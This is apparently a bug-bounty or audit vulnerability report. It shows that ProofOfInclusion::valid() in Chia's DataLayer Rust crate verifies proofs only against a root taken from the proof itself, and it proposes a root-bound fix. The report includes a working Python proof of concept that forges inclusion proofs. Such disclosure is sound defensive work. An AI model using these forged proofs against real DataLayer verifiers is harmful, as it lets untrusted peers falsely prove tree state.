### Title
`ProofOfInclusion::valid()` Performs No External Root Binding — Forged Inclusion Proofs Always Pass — (`File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only verifies the internal self-consistency of the proof's layer chain. It derives the "trusted" root entirely from the last field of the attacker-supplied proof struct (`last.combined_hash`), making the final equality check a tautology. Any attacker who can supply a `ProofOfInclusion` object — via the Python/wasm bindings, Streamable deserialization, or direct construction — can forge a proof for any arbitrary `node_hash` and have `valid()` return `true`, with no connection to any real Merkle tree root.

### Finding Description

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← comes from the proof itself
    } else {
        self.node_hash       // ← also comes from the proof itself
    }
}
```

`valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← tautology
}
```

After the loop, `existing_hash` equals the last `calculated_hash`, which the loop already asserted equals `last_layer.combined_hash`. `self.root_hash()` also returns `last_layer.combined_hash`. The final comparison is therefore always `last_layer.combined_hash == last_layer.combined_hash` — unconditionally `true` whenever the loop completes without returning `false`.

The loop itself only checks that each layer's `combined_hash` is the correct hash of its two children — i.e., internal self-consistency. It never compares the computed root against any externally-known, trusted root hash. No parameter for a trusted root is accepted.

**Exploit path (zero-layer case):**
An attacker constructs:
```python
proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[])
assert proof.valid()          # True — always
assert proof.root_hash() == fake_leaf_hash  # True — tautology
```
`valid()` returns `True` for any `node_hash` with an empty `layers` list.

**Exploit path (multi-layer case):**
An attacker picks any `node_hash` H, any `other_hash` values, computes each `combined_hash` correctly using `calculate_internal_hash`, and assembles a `ProofOfInclusion`. `valid()` returns `True` for a fabricated root that has no relation to any real `MerkleBlob`.

The struct is fully constructible from Python via `ProofOfInclusion.__new__()` and from bytes via `ProofOfInclusion.from_bytes()` / `from_bytes_unchecked()`, both exposed in the Python wheel. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation

Any verifier that calls `proof.valid()` to decide whether a key-value pair is committed to a known DataLayer tree root is bypassed. An attacker can:

1. Claim that an arbitrary key/value hash is included in any tree root of their choice.
2. Claim that a deleted or never-inserted key is still present.
3. Prove inclusion in a tree root that was never published on-chain.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … lets untrusted input prove invalid state."** [4](#0-3) 

### Likelihood Explanation

The `ProofOfInclusion` struct is a `Streamable` type exposed directly to Python callers via `from_bytes`, `from_bytes_unchecked`, `parse_rust`, and `__new__`. Any untrusted peer that sends a serialized proof to a node running the DataLayer can trigger this path. No privileged access is required — only the ability to supply bytes to the deserialization boundary. [5](#0-4) [6](#0-5) 

### Recommendation

`valid()` must accept a trusted root hash as a parameter and compare the computed root against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against externally-known root
}
```

The existing `valid()` (no-argument form) should either be removed or clearly documented as an internal-consistency-only check that provides no security guarantee without a separate root comparison. The Python binding should expose `valid(root_hash: bytes32) -> bool` and deprecate the zero-argument form. [4](#0-3) 

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob
from chia_rs import bytes32

# Build a real tree with one entry
blob = MerkleBlob(blob=bytearray())
real_key   = 1
real_value = 1
real_hash  = bytes32(b'\xaa' * 32)
blob.insert(real_key, real_value, real_hash)
blob.calculate_lazy_hashes()
real_root = blob.get_root_hash()

# Forge a proof claiming a completely different hash is in the tree
fake_leaf_hash = bytes32(b'\xbb' * 32)

# Zero-layer forgery: claim fake_leaf_hash IS the root
forged_proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[])
assert forged_proof.valid()                          # True — BUG
assert forged_proof.root_hash() == fake_leaf_hash   # True — attacker-chosen root
# real_root != fake_leaf_hash, yet valid() returned True

# Multi-layer forgery: claim fake_leaf_hash is under a fabricated root
from chia_rs.datalayer import ProofOfInclusionLayer, Side
other = bytes32(b'\xcc' * 32)
from hashlib import sha256
combined = bytes32(sha256(b'\x02' + other + fake_leaf_hash).digest())
layer = ProofOfInclusionLayer(other_hash_side=0, other_hash=other, combined_hash=combined)
forged_proof2 = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[layer])
assert forged_proof2.valid()   # True — BUG, fabricated root accepted
